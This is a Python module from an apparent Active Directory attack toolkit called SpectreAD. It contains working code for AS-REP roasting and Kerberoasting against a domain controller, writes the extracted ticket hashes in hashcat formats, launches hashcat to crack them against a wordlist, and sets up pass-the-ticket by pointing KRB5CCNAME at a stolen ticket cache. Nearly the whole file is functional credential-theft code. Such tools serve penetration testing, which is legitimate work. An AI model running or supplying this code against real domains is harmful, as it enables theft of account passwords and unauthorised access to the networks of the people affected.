"""
SpectreAD :: core/roast.py
AS-REP roasting, Kerberoasting, ticket injection.

Author : Inayat Hussain
"""

from __future__ import annotations

import os

from core import ui
from core.store import open_store


def _write(out_dir: str, name: str, lines: list[str]) -> str:
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, name)
    with open(path, "w") as fh:
        fh.write("\n".join(lines) + "\n")
    os.chmod(path, 0o600)
    return path


def asrep(args) -> None:
    import datetime

    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AS_REP, AS_REQ
    from impacket.krb5.kerberosv5 import sendReceive
    from impacket.krb5.types import KerberosTime, Principal
    from pyasn1.codec.der import decoder, encoder

    with open_store(args.store) as store:
        targets = [r["sam"] for r in store.users() if r["dontreqpreauth"]]
        if not targets:
            ui.warn("no DONT_REQUIRE_PREAUTH accounts cached — run ldap first")
            return
        ui.info(f"{len(targets)} AS-REP roastable account(s)")

        hashes = []
        for sam in targets:
            try:
                principal = Principal(f"{sam}@{args.domain}",
                                      type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                req = AS_REQ()
                req["pvno"] = 5
                req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
                req["padata"] = []
                req["req-body"]["kdc-options"] = 0x40810010
                req["req-body"]["cname"] = principal
                req["req-body"]["realm"] = args.domain
                req["req-body"]["sname"]["name-type"] = \
                    constants.PrincipalNameType.NT_SRV_INST.value
                req["req-body"]["sname"]["name-string"] = ["krbtgt", args.domain]
                req["req-body"]["till"] = KerberosTime.to_asn1(
                    datetime.datetime.utcnow() + datetime.timedelta(days=1))
                req["req-body"]["rtime"] = req["req-body"]["till"]
                req["req-body"]["nonce"] = 1

                raw = sendReceive(encoder.encode(req), args.domain, args.dc_ip)
                _, rest = decoder.decode(raw, asn1Spec=AS_REP())
                hashes.append(f"$krb5asrep$23${sam}@{args.domain}:" +
                              rest["enc-part"]["cipher"].hex())
                ui.ok(f"AS-REP  {sam}")
                store.add_finding("high", "AS-REP roastable", sam)
            except Exception as exc:
                ui.fail(f"{sam}: {exc}")

        if hashes:
            path = _write(args.out_dir, "asrep.hash", hashes)
            ui.ok(f"{len(hashes)} hash(es) -> {path}   (hashcat -m 18200)")
            store.log("asrep", "hashes", args.domain, str(len(hashes)))
            if args.crack:
                _crack(path, 18200, args.wordlist)


def kerb(args) -> None:
    from impacket.krb5.kerberosv5 import getKerberosTGS
    from impacket.krb5.types import Principal

    with open_store(args.store) as store:
        from core.creds import resolve
        cred = resolve(args, store)
        domain, user, pwd, lm, nt = cred.to_impacket()

        accounts = [(r["sam"], r["spn"].split(",")[0]) for r in store.users() if r["spn"]]
        if not accounts:
            ui.warn("no SPN accounts cached — run ldap first")
            return
        ui.info(f"{len(accounts)} Kerberoastable account(s)")

        hashes, aes_only = [], []
        for sam, spn in accounts:
            try:
                tgs, cipher, _, _ = getKerberosTGS(
                    Principal(spn, type=1), args.domain, args.dc_ip,
                    Principal(user, type=1), pwd, nt, lm, None, None)
                if cipher == 23:
                    hashes.append(f"$krb5tgs$23$*{sam}${args.domain}${spn}*$" + tgs.hex())
                    ui.ok(f"TGS RC4  {sam}  ({spn})")
                else:
                    aes_only.append(f"$krb5tgs${cipher}$*{sam}${args.domain}${spn}*$" + tgs.hex())
                    ui.warn(f"TGS AES{cipher}  {sam}  ({spn})")
                store.add_finding("high", "Kerberoastable SPN", f"{sam} -> {spn}")
            except Exception as exc:
                ui.fail(f"{sam}: {exc}")

        if hashes:
            path = _write(args.out_dir, "kerb.hash", hashes)
            ui.ok(f"{len(hashes)} RC4 hash(es) -> {path}   (hashcat -m 13100)")
            if args.crack:
                _crack(path, 13100, args.wordlist)
        if aes_only:
            path = _write(args.out_dir, "kerb_aes.hash", aes_only)
            ui.warn(f"{len(aes_only)} AES hash(es) -> {path}   (hashcat -m 19700/19600)")
        store.log("kerb", "hashes", args.domain, f"{len(hashes)}+{len(aes_only)}")


def _crack(path: str, mode: int, wordlist) -> None:
    import shutil
    import subprocess

    if not shutil.which("hashcat"):
        ui.warn("hashcat not installed — skipping crack")
        return
    if not wordlist:
        ui.warn("no -wordlist given — skipping crack")
        return
    ui.edge(f"hashcat -m {mode} {path} {wordlist}")
    subprocess.run(["hashcat", "-m", str(mode), path, wordlist, "--quiet"], check=False)


def ptt(args) -> None:
    path = getattr(args, "ccache", None) or getattr(args, "kirbi", None)
    if not path or not os.path.exists(path):
        ui.die("give -ccache <file.ccache> or -kirbi <file.kirbi>")
    if path.endswith(".kirbi"):
        import subprocess
        out = os.path.splitext(path)[0] + ".ccache"
        subprocess.run(["impacket-ticketConverter", path, out], check=False)
        path = out
    os.environ["KRB5CCNAME"] = f"FILE:{os.path.abspath(path)}"
    ui.ok(f"KRB5CCNAME={os.environ['KRB5CCNAME']}")
    ui.info("use -k on later modules, and export it in your shell")
